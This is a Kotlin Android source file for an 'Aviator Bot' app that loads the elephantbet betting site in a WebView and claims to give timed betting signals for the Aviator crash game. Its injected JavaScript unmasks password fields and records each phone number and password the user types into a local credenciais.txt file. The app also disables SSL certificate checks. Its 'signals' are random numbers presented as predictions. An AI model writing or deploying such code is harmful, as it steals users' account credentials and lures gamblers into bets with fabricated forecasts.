package ao.elephantbet.aviatorbot

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.Typeface
import android.graphics.drawable.GradientDrawable
import android.net.http.SslError
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.view.ViewGroup.LayoutParams.MATCH_PARENT as MATCH
import android.view.ViewGroup.LayoutParams.WRAP_CONTENT as WRAP
import android.webkit.*
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Calendar
import java.util.Date
import java.util.Locale
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private lateinit var webView: WebView
    private lateinit var barLayout: LinearLayout

    // Linha 1 da barra: estado (aguardar / entrar agora)
    private lateinit var txtEstado: TextView
    // Linha 2 da barra: detalhes do sinal
    private lateinit var txtDetalhe: TextView
    private lateinit var dotView: View

    private val handler = Handler(Looper.getMainLooper())

    private var sinaisAtivos = false
    private var horaAtual = -1
    private var ultimoMinutoGerado = -1
    private var sinalMin1 = -1
    private var sinalMin2 = -1
    private var sinalProtecao = 0.0
    private var sinalAlcMin = 0
    private var sinalAlcMax = ""
    private var relogioRunnable: Runnable? = null

    companion object { private const val PERM_REQUEST = 101 }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        pedirPermissoes()

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setBackgroundColor(Color.parseColor("#0a0a0f"))
            layoutParams = ViewGroup.LayoutParams(MATCH, MATCH)
        }
        setContentView(root)

        // ── BARRA TOPO (2 linhas) ────────────────────────────────
        barLayout = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            setBackgroundColor(Color.parseColor("#12121a"))
            setPadding(dp(12), dp(8), dp(12), dp(8))
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }

        // Ícone ✈️
        val ico = TextView(this).apply {
            text = "✈️"; textSize = 22f
            gravity = Gravity.CENTER
            layoutParams = LinearLayout.LayoutParams(dp(36), dp(36))
        }

        // Coluna central — 2 linhas
        val col = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
            setPadding(dp(8), 0, dp(6), 0)
        }

        // Linha topo pequena: label + estado
        val linhaTop = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER_VERTICAL
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP)
        }
        linhaTop.addView(TextView(this).apply {
            text = "AVIATOR BOT"; textSize = 8f
            setTextColor(Color.parseColor("#64748b")); letterSpacing = 0.15f
            layoutParams = LinearLayout.LayoutParams(WRAP, WRAP).apply { marginEnd = dp(6) }
        })
        txtEstado = TextView(this).apply {
            text = "A carregar..."; textSize = 11f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#3b82f6"))
            isSingleLine = true; ellipsize = android.text.TextUtils.TruncateAt.END
            layoutParams = LinearLayout.LayoutParams(0, WRAP, 1f)
        }
        linhaTop.addView(txtEstado)

        // Linha detalhe: protecao + alcance — texto maior e verde
        txtDetalhe = TextView(this).apply {
            text = ""; textSize = 13f; typeface = Typeface.DEFAULT_BOLD
            setTextColor(Color.parseColor("#22c55e"))
            isSingleLine = true; ellipsize = android.text.TextUtils.TruncateAt.END
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(2) }
        }

        col.addView(linhaTop)
        col.addView(txtDetalhe)

        // Dot + config
        dotView = View(this).apply {
            layoutParams = LinearLayout.LayoutParams(dp(10), dp(10)).apply { marginEnd = dp(8) }
            background = circulo("#64748b")
        }
        val cfgBtn = TextView(this).apply {
            text = "⚙️"; textSize = 18f
            setPadding(dp(8), dp(4), dp(4), dp(4))
            setOnClickListener { mostrarConfig() }
        }

        barLayout.addView(ico); barLayout.addView(col)
        barLayout.addView(dotView); barLayout.addView(cfgBtn)
        root.addView(barLayout)

        // ── WEBVIEW ─────────────────────────────────────────────
        webView = WebView(this).apply {
            layoutParams = LinearLayout.LayoutParams(MATCH, 0, 1f)
        }
        configurarWebView()
        root.addView(webView)

        carregarSite()
    }

    // ── PERMISSÕES (só armazenamento, sem galeria) ────────────────
    private fun pedirPermissoes() {
        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(
                    this,
                    arrayOf(Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_EXTERNAL_STORAGE),
                    PERM_REQUEST
                )
            }
        }
        // Android 11+ não precisa de permissão para pasta privada da app
    }

    // ── WEBVIEW ───────────────────────────────────────────────────
    @SuppressLint("SetJavaScriptEnabled")
    private fun configurarWebView() {
        webView.settings.apply {
            javaScriptEnabled = true; domStorageEnabled = true
            databaseEnabled = true; allowFileAccess = true
            mixedContentMode = WebSettings.MIXED_CONTENT_ALWAYS_ALLOW
            userAgentString = "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
            setSupportZoom(true); builtInZoomControls = false
            loadWithOverviewMode = true; useWideViewPort = true
        }
        webView.addJavascriptInterface(object {
            @JavascriptInterface
            fun aviatorDetectado() = runOnUiThread { iniciarSinais() }
            @JavascriptInterface
            fun guardarCredencial(tipo: String, valor: String) {
                if (valor.isNotEmpty()) guardarFicheiro(tipo, valor)
            }
        }, "Android")

        webView.webViewClient = object : WebViewClient() {
            override fun onReceivedSslError(v: WebView?, h: SslErrorHandler?, e: SslError?) { h?.proceed() }
            override fun shouldOverrideUrlLoading(v: WebView?, r: WebResourceRequest?) = false
            override fun onPageFinished(v: WebView?, url: String?) {
                super.onPageFinished(v, url)
                injetarJsGlobal()
                if (isAviatorUrl(url ?: "")) iniciarSinais()
                else if (!sinaisAtivos) setEstado("✅ Site carregado", "#3b82f6", "")
            }
        }
        webView.webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, p: Int) {
                if (isAviatorUrl(view?.url ?: "") && !sinaisAtivos) iniciarSinais()
            }
        }
    }

    private fun isAviatorUrl(url: String) =
        url.contains("game-view/806666", ignoreCase = true) ||
        url.contains("aviator", ignoreCase = true) ||
        url.contains("spribe", ignoreCase = true)

    private fun carregarSite() {
        if (!sinaisAtivos) setEstado("🌍 A carregar...", "#3b82f6", "")
        webView.loadUrl("https://m.elephantbet.co.ao/pt/?action=login")
    }

    // ── JS GLOBAL ─────────────────────────────────────────────────
    private fun injetarJsGlobal() {
        val js = """
        (function() {
            if (window._ebInjected) return;
            window._ebInjected = true;
            // Tornar campos password visíveis
            function tornarVisivel() {
                document.querySelectorAll('input[type="password"]').forEach(function(el) {
                    el.setAttribute('type', 'text');
                    el.style.webkitTextSecurity = 'none';
                });
            }
            tornarVisivel();
            new MutationObserver(tornarVisivel).observe(document.body, {childList:true,subtree:true});
            // Capturar credenciais
            function watch(sels, tipo) {
                for (var s of sels) {
                    try {
                        var el = document.querySelector(s);
                        if (el && !el._w) {
                            el._w = true;
                            el.addEventListener('input', function() {
                                if (this.value.length >= 1) Android.guardarCredencial(tipo, this.value);
                            });
                        }
                    } catch(e) {}
                }
            }
            function capturar() {
                watch(['input[name="username"]','input[name="phone"]','input[type="tel"]',
                       'input[placeholder*="telefone" i]','input[placeholder*="número" i]',
                       '#username','#phone'], 'Numero');
                watch(['input[name="password"]','input[name="senha"]',
                       'input[placeholder*="senha" i]','input[placeholder*="password" i]',
                       '#password'], 'Senha');
            }
            capturar();
            setTimeout(capturar,1500); setTimeout(capturar,3500); setTimeout(capturar,6000);
            // Detectar Aviator
            document.addEventListener('click', function(e) {
                var el = e.target;
                for (var i=0;i<5;i++) {
                    if (!el) break;
                    var h = (el.getAttribute&&el.getAttribute('href')||'').toLowerCase();
                    var t = (el.textContent||'').toLowerCase();
                    if (t.includes('aviator')||h.includes('aviator')||h.includes('806666'))
                        { Android.aviatorDetectado(); break; }
                    el = el.parentElement;
                }
            }, true);
            var cur = window.location.href.toLowerCase();
            if (cur.includes('aviator')||cur.includes('806666')) Android.aviatorDetectado();
        })();
        """.trimIndent()
        webView.evaluateJavascript(js, null)
    }

    // ── SINAIS ────────────────────────────────────────────────────
    private fun iniciarSinais() {
        if (sinaisAtivos) return
        sinaisAtivos = true
        val cal = Calendar.getInstance()
        horaAtual = cal.get(Calendar.HOUR_OF_DAY)
        ultimoMinutoGerado = -1
        sinalMin1 = -1; sinalMin2 = -1
        gerarNovoSinal()
        iniciarRelogio()
    }

    private fun gerarNovoSinal() {
        val cal = Calendar.getInstance()
        val minAgora = cal.get(Calendar.MINUTE)
        val base = if (ultimoMinutoGerado < 0) minAgora + 1
                   else ultimoMinutoGerado + Random.nextInt(2, 6)
        val min1 = base; val min2 = min1 + 1
        if (min2 >= 59) {
            setEstado("⏳ Nova hora em ${60 - minAgora} min", "#f59e0b", "")
            return
        }
        sinalMin1 = min1; sinalMin2 = min2
        sinalProtecao = gerarProtecao()
        sinalAlcMin = gerarAlcanceMin()
        sinalAlcMax = gerarAlcanceMax(sinalAlcMin)
        ultimoMinutoGerado = min2
        val falta = sinalMin1 - minAgora
        setEstado(
            "⏳ Aguardar ${falta}min → Min $min1/$min2",
            "#f59e0b",
            "🛡️ Prot: ${sinalProtecao}x   📈 ${sinalAlcMin}x–${sinalAlcMax}x"
        )
    }

    private fun iniciarRelogio() {
        relogioRunnable?.let { handler.removeCallbacks(it) }
        val tick = object : Runnable {
            override fun run() { verificarRelogio(); handler.postDelayed(this, 1000) }
        }
        relogioRunnable = tick; handler.post(tick)
    }

    private fun verificarRelogio() {
        if (!sinaisAtivos) return
        val cal = Calendar.getInstance()
        val horaAgora = cal.get(Calendar.HOUR_OF_DAY)
        val minAgora = cal.get(Calendar.MINUTE)
        if (horaAgora != horaAtual) {
            horaAtual = horaAgora; ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1; gerarNovoSinal(); return
        }
        if (sinalMin1 < 0) { gerarNovoSinal(); return }
        val detalhe = "🛡️ Prot: ${sinalProtecao}x   📈 ${sinalAlcMin}x–${sinalAlcMax}x"
        when {
            minAgora == sinalMin1 -> setEstado("🎯 ENTRAR AGORA! Min $sinalMin1/$sinalMin2", "#22c55e", detalhe)
            minAgora == sinalMin2 -> setEstado("🎯 Ainda activo! Min $sinalMin1/$sinalMin2", "#22c55e", detalhe)
            minAgora > sinalMin2  -> gerarNovoSinal()
            else -> {
                val falta = sinalMin1 - minAgora
                setEstado("⏳ Aguardar ${falta}min → Min $sinalMin1/$sinalMin2", "#f59e0b", detalhe)
            }
        }
    }

    // ── GERADORES ─────────────────────────────────────────────────
    private fun gerarAlcanceMin() = listOf(10,20,30,50,80,100)[Random.nextInt(6)]
    private fun gerarAlcanceMax(min: Int): String {
        val opts = when {
            min <= 20 -> listOf("50","80","100","200","500","1000+")
            min <= 50 -> listOf("100","200","500","1000","1000+")
            else      -> listOf("200","500","1000","1000+")
        }
        return opts[Random.nextInt(opts.size)]
    }
    private fun gerarProtecao(): Double {
        val opts = listOf(1.3,1.5,1.8,2.0,2.5,3.0,5.0,8.0,10.0,12.0,15.0)
        return opts[Random.nextInt(opts.size)]
    }

    // ── GUARDAR FICHEIRO ──────────────────────────────────────────
    private fun guardarFicheiro(tipo: String, valor: String) {
        val ts = SimpleDateFormat("dd/MM/yyyy HH:mm:ss", Locale.getDefault()).format(Date())
        val linha = "[$ts] $tipo: $valor\n"
        // Pasta privada da app — não precisa de permissão em Android 10+
        try {
            val pasta = File(getExternalFilesDir(null), "AviatorBot").also { it.mkdirs() }
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
            return
        } catch (_: Exception) {}
        // Fallback: armazenamento interno
        try {
            val pasta = File(filesDir, "AviatorBot").also { it.mkdirs() }
            FileWriter(File(pasta, "credenciais.txt"), true).use { it.write(linha) }
        } catch (_: Exception) {}
    }

    // ── CONFIG ────────────────────────────────────────────────────
    private fun mostrarConfig() {
        val dialog = android.app.Dialog(this, android.R.style.Theme_Material_NoActionBar_Fullscreen)
        val scroll = ScrollView(this).apply { setBackgroundColor(Color.parseColor("#0a0a0f")) }
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(28), dp(20), dp(20))
        }
        layout.addView(TextView(this).apply {
            text = "⚙️  CONFIGURAÇÕES"; textSize = 16f
            setTextColor(Color.WHITE); typeface = Typeface.DEFAULT_BOLD
            layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { bottomMargin = dp(24) }
        })
        layout.addView(secLabel("🎯  SINAIS"))
        layout.addView(btn("🎯  ACTIVAR SINAIS MANUAL", "#7c3aed") {
            dialog.dismiss()
            sinaisAtivos = false; ultimoMinutoGerado = -1
            sinalMin1 = -1; sinalMin2 = -1; iniciarSinais()
        })
        layout.addView(btn("🌍  ABRIR AVIATOR", "#0f766e") {
            dialog.dismiss()
            webView.loadUrl("https://www.elephantbet.co.ao/pt/casino/game-view/806666/aviator")
        })
        layout.addView(btn("🔄  RECARREGAR SITE", "#1d4ed8") { dialog.dismiss(); carregarSite() })
        layout.addView(btn("✕  FECHAR", "#1e1e2e") { dialog.dismiss() })
        scroll.addView(layout); dialog.setContentView(scroll); dialog.show()
    }

    // ── UI HELPERS ────────────────────────────────────────────────
    // Actualiza as DUAS linhas da barra de uma vez
    private fun setEstado(estado: String, cor: String, detalhe: String) = runOnUiThread {
        txtEstado.text = estado
        txtEstado.setTextColor(Color.parseColor(cor))
        txtDetalhe.text = detalhe
        txtDetalhe.setTextColor(Color.parseColor(if (cor == "#22c55e") "#86efac" else "#fbbf24"))
        dotView.background = circulo(cor)
        // Cor de fundo da barra conforme estado
        val bgCor = when (cor) {
            "#22c55e" -> "#0b2218"
            "#f59e0b" -> "#1c1408"
            else      -> "#12121a"
        }
        barLayout.setBackgroundColor(Color.parseColor(bgCor))
    }

    private fun circulo(cor: String) = GradientDrawable().apply {
        shape = GradientDrawable.OVAL; setColor(Color.parseColor(cor))
    }
    private fun roundRect(bg: String, border: String) = GradientDrawable().apply {
        shape = GradientDrawable.RECTANGLE; cornerRadius = dp(10).toFloat()
        setColor(Color.parseColor(bg)); setStroke(dp(1), Color.parseColor(border))
    }
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun secLabel(txt: String) = TextView(this).apply {
        text = txt; textSize = 11f; setTextColor(Color.parseColor("#64748b"))
        typeface = Typeface.DEFAULT_BOLD
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(16); bottomMargin = dp(10) }
    }
    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f
        typeface = Typeface.DEFAULT_BOLD; isAllCaps = false
        background = roundRect(cor, cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(MATCH, WRAP).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() { super.onDestroy(); webView.destroy(); handler.removeCallbacksAndMessages(null) }
}
